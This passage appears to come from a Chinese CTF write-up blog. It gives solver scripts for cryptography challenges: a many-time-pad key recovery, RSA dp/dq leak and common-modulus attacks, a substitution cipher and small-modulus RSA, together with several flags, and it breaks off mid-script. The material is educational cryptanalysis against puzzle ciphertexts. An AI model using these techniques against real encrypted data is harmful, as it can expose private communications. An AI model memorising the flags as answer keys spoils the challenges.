class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">## OTP - Recovering the private key from a set of messages that were encrypted w/ the same private key (Many time pad attack) - crypto100-many_time_secret @ alexctf 2017</span></span><br><span class="line"><span class="comment"># Original code by jwomers: https://github.com/Jwomers/many-time-pad-attack/blob/master/attack.py)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> collections</span><br><span class="line"><span class="keyword">import</span> sets, sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 11 unknown ciphertexts (in hex format), all encrpyted with the same key</span></span><br><span class="line"></span><br><span class="line">c1=<span class="string">&#x27;25030206463d3d393131555f7f1d061d4052111a19544e2e5d&#x27;</span></span><br><span class="line">c2=<span class="string">&#x27;0f020606150f203f307f5c0a7f24070747130e16545000035d&#x27;</span></span><br><span class="line">c3=<span class="string">&#x27;1203075429152a7020365c167f390f1013170b1006481e1314&#x27;</span></span><br><span class="line">c4=<span class="string">&#x27;0f4610170e1e2235787f7853372c0f065752111b15454e0e09&#x27;</span></span><br><span class="line">c5=<span class="string">&#x27;081543000e1e6f3f3a3348533a270d064a02111a1b5f4e0a18&#x27;</span></span><br><span class="line">c6=<span class="string">&#x27;0909075412132e247436425332281a1c561f04071d520f0b11&#x27;</span></span><br><span class="line">c7=<span class="string">&#x27;4116111b101e2170203011113a69001b475206011552050219&#x27;</span></span><br><span class="line">c8=<span class="string">&#x27;041006064612297020375453342c17545a01451811411a470e&#x27;</span></span><br><span class="line">c9=<span class="string">&#x27;021311114a5b0335207f7c167f22001b44520c15544801125d&#x27;</span></span><br><span class="line">c10=<span class="string">&#x27;06140611460c26243c7f5c167f3d015446010053005907145d&#x27;</span></span><br><span class="line">c11=<span class="string">&#x27;0f05110d160f263f3a7f4210372c03111313090415481d49&#x27;</span></span><br><span class="line">ciphers = [c1, c2, c3, c4, c5, c6, c7, c8, c9, c10, c11]</span><br><span class="line"><span class="comment"># The target ciphertext we want to crack</span></span><br><span class="line"><span class="comment">#target_cipher = &quot;0529242a631234122d2b36697f13272c207f2021283a6b0c7908&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># XORs two string</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strxor</span>(<span class="params">a, b</span>):</span>     <span class="comment"># xor two strings (trims the longer input)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(<span class="built_in">ord</span>(x) ^ <span class="built_in">ord</span>(y)) <span class="keyword">for</span> (x, y) <span class="keyword">in</span> <span class="built_in">zip</span>(a, b)])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">target_fix</span>(<span class="params">target_cipher</span>):</span></span><br><span class="line">    <span class="comment"># To store the final key</span></span><br><span class="line">    final_key = [<span class="literal">None</span>]*<span class="number">150</span></span><br><span class="line">    <span class="comment"># To store the positions we know are broken</span></span><br><span class="line">    known_key_positions = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># For each ciphertext</span></span><br><span class="line">    <span class="keyword">for</span> current_index, ciphertext <span class="keyword">in</span> <span class="built_in">enumerate</span>(ciphers):</span><br><span class="line">        counter = collections.Counter()</span><br><span class="line">        <span class="comment"># for each other ciphertext</span></span><br><span class="line">        <span class="keyword">for</span> index, ciphertext2 <span class="keyword">in</span> <span class="built_in">enumerate</span>(ciphers):</span><br><span class="line">            <span class="keyword">if</span> current_index != index: <span class="comment"># don&#x27;t xor a ciphertext with itself</span></span><br><span class="line">                <span class="keyword">for</span> indexOfChar, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(strxor(ciphertext.decode(<span class="string">&#x27;hex&#x27;</span>), ciphertext2.decode(<span class="string">&#x27;hex&#x27;</span>))): <span class="comment"># Xor the two ciphertexts</span></span><br><span class="line">                    <span class="comment"># If a character in the xored result is a alphanumeric character, it means there was probably a space character in one of the plaintexts (we don&#x27;t know which one)</span></span><br><span class="line">                    <span class="keyword">if</span> char <span class="keyword">in</span> string.printable <span class="keyword">and</span> char.isalpha(): counter[indexOfChar] += <span class="number">1</span> <span class="comment"># Increment the counter at this index</span></span><br><span class="line">        knownSpaceIndexes = []</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Loop through all positions where a space character was possible in the current_index cipher</span></span><br><span class="line">        <span class="keyword">for</span> ind, val <span class="keyword">in</span> counter.items():</span><br><span class="line">            <span class="comment"># If a space was found at least 7 times at this index out of the 9 possible XORS, then the space character was likely from the current_index cipher!</span></span><br><span class="line">            <span class="keyword">if</span> val &gt;= <span class="number">7</span>: knownSpaceIndexes.append(ind)</span><br><span class="line">        <span class="comment">#print knownSpaceIndexes # Shows all the positions where we now know the key!</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Now Xor the current_index with spaces, and at the knownSpaceIndexes positions we get the key back!</span></span><br><span class="line">        xor_with_spaces = strxor(ciphertext.decode(<span class="string">&#x27;hex&#x27;</span>),<span class="string">&#x27; &#x27;</span>*<span class="number">150</span>)</span><br><span class="line">        <span class="keyword">for</span> index <span class="keyword">in</span> knownSpaceIndexes:</span><br><span class="line">            <span class="comment"># Store the key&#x27;s value at the correct position</span></span><br><span class="line">            final_key[index] = xor_with_spaces[index].encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">            <span class="comment"># Record that we known the key at this position</span></span><br><span class="line">            known_key_positions.add(index)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Construct a hex key from the currently known key, adding in &#x27;00&#x27; hex chars where we do not know (to make a complete hex string)</span></span><br><span class="line">    final_key_hex = <span class="string">&#x27;&#x27;</span>.join([val <span class="keyword">if</span> val <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="string">&#x27;00&#x27;</span> <span class="keyword">for</span> val <span class="keyword">in</span> final_key])</span><br><span class="line">    <span class="comment"># Xor the currently known key with the target cipher</span></span><br><span class="line">    output = strxor(target_cipher.decode(<span class="string">&#x27;hex&#x27;</span>),final_key_hex.decode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Fix this sentence:&quot;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;&#x27;</span>.join([char <span class="keyword">if</span> index <span class="keyword">in</span> known_key_positions <span class="keyword">else</span> <span class="string">&#x27;*&#x27;</span> <span class="keyword">for</span> index, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(output)])+<span class="string">&quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># WAIT.. MANUAL STEP HERE </span></span><br><span class="line">    <span class="comment"># This output are printing a * if that character is not known yet</span></span><br><span class="line">    <span class="comment"># fix the missing characters like this: &quot;Let*M**k*ow if *o&#123;*a&quot; = &quot;cure, Let Me know if you a&quot;</span></span><br><span class="line">    <span class="comment"># if is too hard, change the target_cipher to another one and try again</span></span><br><span class="line">    <span class="comment"># and we have our key to fix the entire text!</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#sys.exit(0) #comment and continue if u got a good key</span></span><br><span class="line"></span><br><span class="line">    target_plaintext = <span class="string">&quot;cure, Let Me know if you a&quot;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Fixed:&quot;</span></span><br><span class="line">    <span class="built_in">print</span> target_plaintext+<span class="string">&quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line">    key = strxor(target_cipher.decode(<span class="string">&#x27;hex&#x27;</span>),target_plaintext)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Decrypted msg:&quot;</span></span><br><span class="line">    <span class="keyword">for</span> cipher <span class="keyword">in</span> ciphers:</span><br><span class="line">        <span class="built_in">print</span> strxor(cipher.decode(<span class="string">&#x27;hex&#x27;</span>),key)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;\nPrivate key recovered: &quot;</span>+key+<span class="string">&quot;\n&quot;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ciphers:</span><br><span class="line">    target_fix(i)</span><br></pre></td></tr></table></figure><h1 id="Buuctf-·-Crypto"><a href="#Buuctf-·-Crypto" class="headerlink" title="Buuctf · Crypto"></a>Buuctf · Crypto</h1><h2 id="RSA1"><a href="#RSA1" class="headerlink" title="RSA1"></a>RSA1</h2><h3 id="题目-4"><a href="#题目-4" class="headerlink" title="题目"></a>题目</h3><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">p</span> = <span class="number">8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229</span> </span><br><span class="line"><span class="attr">q</span> = <span class="number">12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469</span> </span><br><span class="line"><span class="attr">dp</span> = <span class="number">6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929</span> </span><br><span class="line"><span class="attr">dq</span> = <span class="number">783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041</span> </span><br><span class="line"><span class="attr">c</span> = <span class="number">24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span></span><br></pre></td></tr></table></figure><h3 id="题解-3"><a href="#题解-3" class="headerlink" title="题解"></a>题解</h3><p>明显可见，<strong>dp、dq泄漏。</strong></p><p>上代码</p><h4 id="代码-5"><a href="#代码-5" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">p = <span class="number">8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229</span></span><br><span class="line">q = <span class="number">12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469</span></span><br><span class="line">dp = <span class="number">6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929</span></span><br><span class="line">dq = <span class="number">783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041</span></span><br><span class="line">c = <span class="number">24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">I = gmpy2.invert(q, p)</span><br><span class="line">mp = <span class="built_in">pow</span>(c, dp, p)</span><br><span class="line">mq = <span class="built_in">pow</span>(c, dq, q)               <span class="comment">#求幂取模运算</span></span><br><span class="line"></span><br><span class="line">m = (((mp-mq)*I)%p)*q+mq       <span class="comment">#求明文公式</span></span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br><span class="line"><span class="comment"># b&#x27;noxCTF&#123;W31c0m3_70_Ch1n470wn&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="old-fashion"><a href="#old-fashion" class="headerlink" title="old-fashion"></a>old-fashion</h2><h2 id="题目-5"><a href="#题目-5" class="headerlink" title="题目"></a>题目</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Os</span> drnuzearyuwn, y jtkjzoztzoes douwlr oj y ilzwex eq lsdexosa kn pwodw tsozj eq ufyoszlbz yrl rlufydlx pozw douwlrzlbz, ydderxosa ze y rlatfyr jnjzli; mjy gfbmw vla xy wbfnsy symmyew (mjy vrwm qrvvrf), hlbew rd symmyew, mebhsymw rd symmyew, vbomgeyw rd mjy lxrzy, lfk wr dremj. Mjy eyqybzye kyqbhjyew mjy myom xa hyedrevbfn lf bfzyewy wgxwmbmgmbrf. Wr mjy dsln bw f<span class="number">1</span>_<span class="number">2</span>jyf-k<span class="number">3</span>_jg<span class="number">1</span>-vb-vl_l</span><br></pre></td></tr></table></figure><h2 id="题解-4"><a href="#题解-4" class="headerlink" title="题解"></a>题解</h2><p><a href="https://quipqiup.com">quipqiup爆破</a>,得到结果</p><p><img src="https://s2.loli.net/2022/01/12/mYJrT2woEeVjf1W.png" alt="image-20220112191539049"></p><blockquote><p>flag{n1_2hen-d3_hu1-mi-ma_a}</p></blockquote><h2 id="RSA3"><a href="#RSA3" class="headerlink" title="RSA3"></a>RSA3</h2><h3 id="题目-6"><a href="#题目-6" class="headerlink" title="题目"></a>题目</h3><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">c1</span>=<span class="number">22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361</span></span><br><span class="line"><span class="attr">n</span>=<span class="number">22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801</span></span><br><span class="line"><span class="attr">e1</span>=<span class="number">11187289</span></span><br><span class="line"><span class="attr">c2</span>=<span class="number">18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397</span></span><br><span class="line"><span class="attr">e2</span>=<span class="number">9647291</span></span><br></pre></td></tr></table></figure><h3 id="题解-5"><a href="#题解-5" class="headerlink" title="题解"></a>题解</h3><p>共模攻击</p><p>上代码</p><h4 id="代码-6"><a href="#代码-6" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">c1=<span class="number">22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361</span></span><br><span class="line">n=<span class="number">22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801</span></span><br><span class="line">e1=<span class="number">11187289</span></span><br><span class="line">c2=<span class="number">18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397</span></span><br><span class="line">e2=<span class="number">9647291</span></span><br><span class="line"></span><br><span class="line">s, s1, s2 = gmpy2.gcdext(e1, e2)  <span class="comment"># s为gcd(e1, e2)</span></span><br><span class="line">m = <span class="built_in">int</span>(<span class="built_in">pow</span>(c1, s1, n) * <span class="built_in">pow</span>(c2, s2, n) % n)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(m))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="RSA2"><a href="#RSA2" class="headerlink" title="RSA2"></a>RSA2</h2><h3 id="题目-7"><a href="#题目-7" class="headerlink" title="题目"></a>题目</h3><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">e</span> = <span class="number">65537</span></span><br><span class="line"><span class="attr">n</span> = <span class="number">248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113</span></span><br><span class="line"><span class="attr">dp</span> = <span class="number">905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657</span></span><br><span class="line"></span><br><span class="line"><span class="attr">c</span> = <span class="number">140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751</span></span><br></pre></td></tr></table></figure><h3 id="题解-6"><a href="#题解-6" class="headerlink" title="题解"></a>题解</h3><p>dp泄漏</p><h4 id="代码-7"><a href="#代码-7" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gp</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113</span></span><br><span class="line">c = <span class="number">140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751</span></span><br><span class="line">dp = <span class="number">905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, e+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> (dp*e-<span class="number">1</span>) % a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> n % ((dp*e-<span class="number">1</span>) // a + <span class="number">1</span>) == <span class="number">0</span>:  <span class="comment"># ! 关键，易错</span></span><br><span class="line">            p = (dp*e-<span class="number">1</span>) // a + <span class="number">1</span></span><br><span class="line">            q = n // p</span><br><span class="line">            phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">            d = gp.invert(e, phi)</span><br><span class="line">            m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">            <span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        a += <span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="RSAROLL"><a href="#RSAROLL" class="headerlink" title="RSAROLL"></a>RSAROLL</h2><h3 id="题目-8"><a href="#题目-8" class="headerlink" title="题目"></a>题目</h3><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 题目.txt</span></span><br><span class="line">RSA roll！roll！roll！</span><br><span class="line">Only number and a-z</span><br><span class="line">（don&#x27;t use editor</span><br><span class="line">which MS provide）</span><br><span class="line"></span><br><span class="line"># data.txt</span><br><span class="line">&#123;<span class="number">92013971</span>3,19&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">70479679</span>2</span><br><span class="line"><span class="number">75221115</span>2</span><br><span class="line"><span class="number">27470416</span>4</span><br><span class="line"><span class="number">18414022</span></span><br><span class="line"><span class="number">36827083</span>5</span><br><span class="line"><span class="number">48329523</span>5</span><br><span class="line"><span class="number">26307290</span>5</span><br><span class="line"><span class="number">45978847</span>6</span><br><span class="line"><span class="number">48329523</span>5</span><br><span class="line"><span class="number">45978847</span>6</span><br><span class="line"><span class="number">66355179</span>2</span><br><span class="line"><span class="number">47520680</span>4</span><br><span class="line"><span class="number">45978847</span>6</span><br><span class="line"><span class="number">42831337</span>4</span><br><span class="line"><span class="number">47520680</span>4</span><br><span class="line"><span class="number">45978847</span>6</span><br><span class="line"><span class="number">42539213</span>7</span><br><span class="line"><span class="number">70479679</span>2</span><br><span class="line"><span class="number">45826567</span>7</span><br><span class="line"><span class="number">34152465</span>2</span><br><span class="line"><span class="number">48329523</span>5</span><br><span class="line"><span class="number">53414950</span>9</span><br><span class="line"><span class="number">42539213</span>7</span><br><span class="line"><span class="number">42831337</span>4</span><br><span class="line"><span class="number">42539213</span>7</span><br><span class="line"><span class="number">34152465</span>2</span><br><span class="line"><span class="number">45826567</span>7</span><br><span class="line"><span class="number">26307290</span>5</span><br><span class="line"><span class="number">48329523</span>5</span><br><span class="line"><span class="number">82850979</span>7</span><br><span class="line"><span class="number">34152465</span>2</span><br><span class="line"><span class="number">42539213</span>7</span><br><span class="line"><span class="number">47520680</span>4</span><br><span class="line"><span class="number">42831337</span>4</span><br><span class="line"><span class="number">48329523</span>5</span><br><span class="line"><span class="number">47520680</span>4</span><br><span class="line"><span class="number">45978847</span>6</span><br><span class="line"><span class="number">30622014</span>8</span><br></pre></td></tr></table></figure><h3 id="题解-7"><a href="#题解-7" class="headerlink" title="题解"></a>题解</h3><p>不知道题目的考点在哪，无从下手。</p><p>学习他人题解后，得知：</p><ul><li><p>{920139713,19} </p><p>n = 920139713,</p><p>e = 19</p></li><li><p>分解 n得到：</p><p>q = 18443 </p><p>p = 49891</p></li><li><p>常规求phi、d后，对每一行密文（c）进行解密</p></li></ul><h4 id="代码-8"><a href="#代码-8" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n = <span class="number">920139713</span></span><br><span class="line">q = <span class="number">18443</span></span><br><span class="line">p = <span class="number">49891</span></span><br><span class="line">e = <span class="number">19</span></span><br><span class="line">d = <span class="built_in">int</span>(gmpy2.invert(e , (p-<span class="number">1</span>) * (q-<span class="number">1</span>)))</span><br><span class="line"></span><br><span class="line">c = <span class="string">&#x27;&#x27;&#x27;704796792</span></span><br><span class="line"><span class="string">752211152</span></span><br><span class="line"><span class="string">274704164</span></span><br><span class="line"><span class="string">18414022</span></span><br><span class="line"><span class="string">368270835</span></span><br><span class="line"><span class="string">483295235</span></span><br><span class="line"><span class="string">263072905</span></span><br><span class="line"><span class="string">459788476</span></span><br><span class="line"><span class="string">483295235</span></span><br><span class="line"><span class="string">459788476</span></span><br><span class="line"><span class="string">663551792</span></span><br><span class="line"><span class="string">475206804</span></span><br><span class="line"><span class="string">459788476</span></span><br><span class="line"><span class="string">428313374</span></span><br><span class="line"><span class="string">475206804</span></span><br><span class="line"><span class="string">459788476</span></span><br><span class="line"><span class="string">425392137</span></span><br><span class="line"><span class="string">704796792</span></span><br><span class="line"><span class="string">458265677</span></span><br><span class="line"><span class="string">341524652</span></span><br><span class="line"><span class="string">483295235</span></span><br><span class="line"><span class="string">534149509</span></span><br><span class="line"><span class="string">425392137</span></span><br><span class="line"><span class="string">428313374</span></span><br><span class="line"><span class="string">425392137</span></span><br><span class="line"><span class="string">341524652</span></span><br><span class="line"><span class="string">458265677</span></span><br><span class="line"><span class="string">263072905</span></span><br><span class="line"><span class="string">483295235</span></span><br><span class="line"><span class="string">828509797</span></span><br><span class="line"><span class="string">341524652</span></span><br><span class="line"><span class="string">425392137</span></span><br><span class="line"><span class="string">475206804</span></span><br><span class="line"><span class="string">428313374</span></span><br><span class="line"><span class="string">483295235</span></span><br><span class="line"><span class="string">475206804</span></span><br><span class="line"><span class="string">459788476</span></span><br><span class="line"><span class="string">306220148&#x27;&#x27;&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> ii <span class="keyword">in</span> c.split(<span class="string">&#x27;\n&#x27;</span>):</span><br><span class="line">flag += <span class="built_in">chr</span>(<span class="built_in">pow</span>(<span class="built_in">int</span>(ii),d,n))</span><br><span class="line"><span 